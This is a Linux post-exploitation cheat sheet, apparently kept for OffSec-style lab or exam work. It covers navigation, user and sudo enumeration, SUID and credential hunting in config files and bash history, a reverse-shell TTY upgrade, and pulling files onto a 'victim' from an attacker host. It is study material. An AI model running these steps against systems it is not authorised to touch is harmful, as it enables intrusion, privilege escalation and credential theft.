**Purpose:**

Fast reference for commands you repeatedly need **after initial access** on Linux.

---

## Terminal Navigation

### Moving Around Directories

```bash
pwd
```
→ Print working directory — shows where you currently are.

```bash
ls
```
→ List files in current directory.

```bash
ls -la
```
→ List all files including hidden ones, with permissions.

```bash
cd /path/to/folder
```
→ Change into a directory using its full (absolute) path.

```bash
cd foldername
```
→ Change into a folder that's inside your current directory (relative path).

```bash
cd ..
```
→ Go up one directory level.

```bash
cd ~
```
→ Go to your home directory from anywhere.

```bash
cd -
```
→ Go back to the previous directory you were in. Useful when jumping between two locations.

---

### Absolute vs Relative Paths

| Type | Example | Meaning |
|------|---------|---------|
| Absolute | `/home/prudence/notes` | Full path from root — works from anywhere |
| Relative | `notes` or `./notes` | Path from your current location |

---

### Useful Shortcuts

| Shortcut | What it does |
|----------|--------------|
| `Tab` | Autocomplete file/folder names — use this constantly |
| `Tab Tab` | Show all possible completions when there are multiple |
| `Ctrl+C` | Kill the current running command |
| `Ctrl+Z` | Suspend (background) the current process |
| `Ctrl+L` | Clear the terminal screen (same as `clear`) |
| `Up arrow` | Cycle through previous commands |
| `Ctrl+R` | Search command history — type part of a previous command |

---

### Reading Files

```bash
cat filename
```
→ Print entire file contents to screen.

```bash
cat /etc/passwd
```
→ Always use full path when reading files outside current directory.

```bash
less filename
```
→ Read a file page by page. Press `q` to quit, `/word` to search.

---

---

## Who Am I

```bash
whoami
```
→ Current user.

```bash
id
```
→ UID, GID, and group memberships. Look for sudo, docker, lxd, disk.

```bash
uname -a
```
→ Kernel version — needed for kernel exploit research.

```bash
cat /etc/os-release
```
→ Distro and version.

```bash
cat /etc/passwd
```
→ All local users and their home directories.

---

## Sudo

```bash
sudo -l
```
→ **Always run first.** Shows what the current user can run as root without a password.

---

## Processes

```bash
ps aux
```
→ Every running process with user, PID, and command.

```bash
ps aux | grep root
```
→ Only root-owned processes. Use when looking for a process to exploit or dump.

---

## Network

```bash
ss -tlnp
```
→ Listening ports and owning processes.

```bash
ip a
```
→ All interfaces and IPs.

---

## File System

```bash
ls -la
```
→ List including hidden files.

```bash
find /home -name "local.txt" 2>/dev/null
```
→ Find the OffSec user flag.

```bash
find / -name "*.conf" -o -name "*.bak" 2>/dev/null
```
→ Hunt for config/backup files that may hold credentials.

```bash
find / -perm -4000 -type f 2>/dev/null
```
→ All SUID binaries. Check each on GTFOBins.

```bash
cat ~/.bash_history
```
→ Previous commands — may contain plaintext passwords.

---

## Shell Upgrade (After Reverse Shell)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
→ Upgrades a dumb shell to an interactive TTY. Linux only.

---

## File Transfer

```bash
# Kali — host a file:
python3 -m http.server 80

# Victim — download:
wget http://<KALI_IP>/file
curl http://<KALI_IP>/file -o file
```

---

## Related Notes

- [[Linux_Priv_Esc]]
- [[Netcat]]
- [[File_Transfer]]
